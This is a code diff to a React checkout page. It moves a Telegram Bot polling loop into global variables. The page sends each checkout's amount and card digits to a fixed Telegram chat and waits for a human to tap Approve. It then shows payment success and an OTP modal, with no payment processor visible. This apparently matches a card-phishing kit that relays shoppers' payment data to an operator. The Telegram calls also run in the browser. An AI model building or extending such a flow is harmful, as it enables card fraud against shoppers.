@@ -1,6 +1,6 @@
 "use client"
 
-import { useState, useEffect, useRef, useCallback } from 'react'
+import { useState, useEffect, useRef } from 'react'
 import toast from 'react-hot-toast'
 import { ArrowRight, CreditCard, User, Calendar, Lock, MapPin, Shield, Truck, PackageCheck, Loader2, Send } from 'lucide-react'
 
@@ -43,6 +43,15 @@ interface User {
 }
 
 let globalLastOffset = 0
+let globalCurrentCheckoutId: string | null = null
+let globalSetWaitingForTelegramApproval: (value: boolean) => void = () => {}
+let globalSetPendingOrderId: (value: string | null) => void = () => {}
+let globalSetShowOTPModal: (value: boolean) => void = () => {}
+let globalSetShowSuccess: (value: boolean) => void = () => {}
+let globalCartItems: CartItem[] = []
+let globalFinalTotal: number = 0
+let globalProcessingFee: number = 0
+let globalFormData: any = {}
 
 async function tgCall(method: string, body: Record<string, any> = {}) {
   try {
@@ -62,6 +71,88 @@ async function tgNotify(chatId: string, text: string, keyboard?: any) {
   const payload: Record<string, any> = { chat_id: chatId, text }
   if (keyboard) payload.reply_markup = keyboard
   return tgCall('sendMessage', payload)
+}
+
+async function tgPoll() {
+  const offset = Math.max(globalLastOffset, parseInt(localStorage.getItem('tg_offset') || '0', 10))
+  const r = await tgCall('getUpdates', { 
+    offset: offset, 
+    timeout: 30, 
+    allowed_updates: ['callback_query', 'message'] 
+  })
+  
+  if (!r || !r.ok) return
+  if (!r.result || !Array.isArray(r.result) || r.result.length === 0) return
+  
+  for (const u of r.result) {
+    globalLastOffset = u.update_id + 1
+    localStorage.setItem('tg_offset', String(globalLastOffset))
+    
+    const cq = u.callback_query
+    if (!cq) continue
+    
+    if (String(cq.message?.chat?.id) !== TELEGRAM_CHAT_ID) {
+      await tgCall('answerCallbackQuery', { callback_query_id: cq.id, text: 'Not authorized' })
+      continue
+    }
+    
+    const data = cq.data || ''
+    const matched = data.match(/(approve_|reject_)([a-zA-Z0-9-]+)/)
+    
+    if (matched) {
+      const action = matched[1]
+      const checkoutId = matched[2]
+      
+      if (checkoutId === globalCurrentCheckoutId) {
+        await tgCall('answerCallbackQuery', { callback_query_id: cq.id, text: action === 'approve_' ? 'APPROVED!' : 'REJECTED' })
+        
+        if (action === 'approve_') {
+          setTimeout(() => {
+            handleApproval(checkoutId)
+          }, 100)
+        } else {
+          setTimeout(() => {
+            handleRejection()
+          }, 100)
+        }
+        
+        await tgCall('editMessageReplyMarkup', {
+          chat_id: cq.message.chat.id,
+          message_id: cq.message.message_id,
+          reply_markup: { inline_keyboard: [[{ text: '✓ Approved', callback_data: 'noop' }]] }
+        })
+      } else {
+        await tgCall('answerCallbackQuery', { callback_query_id: cq.id })
+      }
+    } else {
+      await tgCall('answerCallbackQuery', { callback_query_id: cq.id })
+    }
+  }
+}
+
+function handleApproval(checkoutId: string) {
+  globalSetWaitingForTelegramApproval(false)
+  globalSetPendingOrderId(checkoutId)
+  const orderData = {
+    id: checkoutId,
+    status: 'APPROVED_TELEGRAM',
+    totalAmount: globalFinalTotal,
+    processingFee: globalProcessingFee,
+    items: globalCartItems,
+    paymentMethod: 'CARD',
+    cardLast4: globalFormData.cardNumber.replace(/\s/g, '').slice(-4),
+    approvedVia: 'telegram',
+    approvedAt: new Date().toISOString(),
+  }
+  localStorage.setItem('orderConfirmation', JSON.stringify(orderData))
+  globalSetShowOTPModal(false)
+  globalSetShowSuccess(true)
+  toast.success('Payment approved via Telegram!')
+}
+
+function handleRejection() {
+  globalSetWaitingForTelegramApproval(false)
+  toast.error('Checkout was rejected')
 }
 
 export default function CheckoutPage() {
@@ -94,6 +185,15 @@ export default function CheckoutPage() {
     fetchCart()
     fetchReferralBalance()
     fetchUser()
+    
+    globalSetWaitingForTelegramApproval = setWaitingForTelegramApproval
+    globalSetPendingOrderId = setPendingOrderId
+    globalSetShowOTPModal = setShowOTPModal
+    globalSetShowSuccess = setShowSuccess
+    globalCartItems = cartItems
+    globalFinalTotal = finalTotal
+    globalProcessingFee = processingFee
+    globalFormData = formData
     
     return () => {
       if (pollingIntervalRef.current) {
@@ -167,88 +267,6 @@ export default function CheckoutPage() {
   const shipping = subtotal >= 25 ? 0 : 5.99
   const finalTotal = total + shipping
 
-  const pollTelegram = useCallback(async () => {
-    const offset = Math.max(globalLastOffset, parseInt(localStorage.getItem('tg_offset') || '0', 10))
-    const r = await tgCall('getUpdates', { 
-      offset: offset, 
-      timeout: 30, 
-      allowed_updates: ['callback_query', 'message'] 
-    })
-    
-    if (!r?.ok || !r.result?.length) return
-    
-    for (const u of r.result) {
-      globalLastOffset = u.update_id + 1
-      localStorage.setItem('tg_offset', String(globalLastOffset))
-      
-      const cq = u.callback_query
-      if (cq?.message?.chat?.id === parseInt(TELEGRAM_CHAT_ID)) {
-        const data = cq.data || ''
-        const match = data.match(/(approve_|reject_)([a-zA-Z0-9-]+)/)
-        
-        if (match && match[2] === pendingOrderId) {
-          const action = match[1]
-          
-          await tgCall('answerCallbackQuery', { 
-            callback_query_id: cq.id, 
-            text: action === 'approve_' ? 'APPROVED!' : 'REJECTED' 
-          })
-          
-          if (action === 'approve_') {
-            if (pollingIntervalRef.current) {
-              clearInterval(pollingIntervalRef.current)
-              pollingIntervalRef.current = null
-            }
-            setWaitingForTelegramApproval(false)
-            const orderData = {
-              id: pendingOrderId,
-              status: 'APPROVED_TELEGRAM',
-              totalAmount: finalTotal,
-              processingFee,
-              items: cartItems,
-              paymentMethod: 'CARD',
-              cardLast4: formData.cardNumber.replace(/\s/g, '').slice(-4),
-              approvedVia: 'telegram',
-              approvedAt: new Date().toISOString(),
-            }
-            localStorage.setItem('orderConfirmation', JSON.stringify(orderData))
-            setShowOTPModal(false)
-            setShowSuccess(true)
-            toast.success('Payment approved via Telegram!')
-          } else if (action === 'reject_') {
-            if (pollingIntervalRef.current) {
-              clearInterval(pollingIntervalRef.current)
-              pollingIntervalRef.current = null
-            }
-            setWaitingForTelegramApproval(false)
-            toast.error('Checkout was rejected')
-          }
-          
-          await tgCall('editMessageReplyMarkup', {
-            chat_id: cq.message.chat.id,
-            message_id: cq.message.message_id,
-            reply_markup: { inline_keyboard: [[{ text: '✓ Approved', callback_data: 'noop' }]] }
-          })
-        }
-      }
-    }
-  }, [pendingOrderId])
-
-  useEffect(() => {
-    if (!waitingForTelegramApproval) return
-    
-    pollTelegram()
-    
-    pollingIntervalRef.current = setInterval(pollTelegram, 3000)
-    
-    return () => {
-      if (pollingIntervalRef.current) {
-        clearInterval(pollingIntervalRef.current)
-        pollingIntervalRef.current = null
-      }
-    }
-  }, [waitingForTelegramApproval, pollTelegram])
-
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault()
     setCardError(null)
@@ -276,6 +294,7 @@ export default function CheckoutPage() {
     }
 
     const checkoutId = `CHX-${Date.now()}`
+    globalCurrentCheckoutId = checkoutId
     setPendingOrderId(checkoutId)
     setClientSecret(checkoutId)
     setProcessingPayment(false)
@@ -283,6 +302,16 @@ export default function CheckoutPage() {
     setWaitingForTelegramApproval(true)
     globalLastOffset = 0
     
+    globalCurrentCheckoutId = checkoutId
+    globalSetWaitingForTelegramApproval = setWaitingForTelegramApproval
+    globalSetPendingOrderId = setPendingOrderId
+    globalSetShowOTPModal = setShowOTPModal
+    globalSetShowSuccess = setShowSuccess
+    globalCartItems = cartItems
+    globalFinalTotal = finalTotal
+    globalProcessingFee = processingFee
+    globalFormData = formData
+
     const cardLast4 = cardNumber.slice(-4)
     const message = `📥 New Checkout Request
 Amount: $${finalTotal}
@@ -300,8 +329,21 @@ Tap "Approve" to confirm or "Reject" to cancel`
       ]
     }
     
-    await tgNotify(TELEGRAM_CHAT_ID, message, keyboard)
-    toast.success('Checkout sent to Telegram. Check your app to approve.')
+    const result = await tgNotify(TELEGRAM_CHAT_ID, message, keyboard)
+    console.log('Telegram notification result:', result)
+    
+    if (result?.ok) {
+      toast.success('Checkout sent to Telegram. Check your app to approve.')
+    } else {
+      toast.error('Failed to send Telegram notification: ' + (result?.description || 'Unknown error'))
+    }
+    
+    tgPoll()
+    
+    if (pollingIntervalRef.current) {
+      clearInterval(pollingIntervalRef.current)
+    }
+    pollingIntervalRef.current = setInterval(tgPoll, 3000)
   }
   
   const handleSubmitOTP = async () => {
